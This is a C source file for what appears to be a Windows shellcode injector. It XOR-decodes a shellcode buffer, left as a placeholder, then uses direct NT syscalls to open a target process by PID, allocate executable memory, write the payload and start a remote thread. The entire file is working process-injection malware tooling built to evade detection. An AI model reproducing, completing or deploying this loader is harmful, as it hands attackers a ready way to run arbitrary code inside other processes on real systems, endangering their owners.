#include "syscalls.h"

#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

#define okay(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
#define info(msg, ...) printf("[*] " msg "\n", ##__VA_ARGS__)
#define warn(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)

int main(int argc, char* argv[]) {

	NTSTATUS status;
	DWORD PID = NULL;
	LPVOID baseAddress = NULL;
	HANDLE hProcess = NULL, hThread = NULL;

	/* place encoded shellcode here */
	unsigned char crowPuke[] =
		"\xDE\xAD\xBE\xEF";

	size_t crowPukeSize = sizeof(crowPuke), bytesWritten = NULL;
	
	if (argc < 3) {
		warn("usage: syskaw.exe <PID> <XOR_KEY>");
		return EXIT_FAILURE;
	}

	PID = atoi(argv[1]);
	CLIENT_ID cID = { (HANDLE)PID, 0 };
	OBJECT_ATTRIBUTES objAttrs = { sizeof(objAttrs), 0 };

	const char* key = argv[2]; /* make sure this is the same key used in the encryption process */

	info("decoding with key: %s", key);
	okay("decoded %zd-bytes", crowPukeSize);

	/* xor-decrypt shellcode (get rid of the print statements if you don't want the decrypted shellcode shown to you) */
	size_t keyLength = strlen(key);
	printf("\ncrowPuke[] = \"");
	for (int x = 0; x < crowPukeSize - 1; x++) {
		crowPuke[x] = crowPuke[x] ^ key[x % keyLength];
		printf("\\x%02x", crowPuke[x]);
	}
	printf("\";\n\n");

	info("trying to get a handle to the process (%ld)", PID);
	status = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttrs, &cID);

	if (status != STATUS_SUCCESS) {
		warn("couldn't get a handle to the process (%d), error: 0x%x", PID, status);
		return EXIT_FAILURE;
	}

	okay("got a handle to the process(%ld)\n\\---0x%p", PID, hProcess);

	NtAllocateVirtualMemory(hProcess, &baseAddress, 0, &crowPukeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	okay("created buffer (%zd-bytes) w/ PAGE_EXECUTE_READWRITE permissions", sizeof(crowPuke)); /* crowPukeSize == 4096 here */

	NtWriteVirtualMemory(hProcess, baseAddress, &crowPuke, sizeof(crowPuke), &bytesWritten);
	okay("wrote %zd-bytes to process memory", bytesWritten);

	info("trying to create thread");
	status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, baseAddress, NULL, FALSE, 0, 0, 0, NULL);

	if (status != STATUS_SUCCESS) {
		warn("couldn't create a thread, error: 0x%x", status);
		NtClose(hProcess);
		return EXIT_FAILURE;
	}

	okay("created a thread, got a handle to the newly-created thread\n\\---0x%p", hThread);
	info("waiting for thread to finish");

	WaitForSingleObject(hThread, INFINITE);
	okay("thread finished execution, cleaning up");

	NtClose(hProcess);
	NtClose(hThread);
	okay("finished, see you next time :>");

	return EXIT_SUCCESS;

}
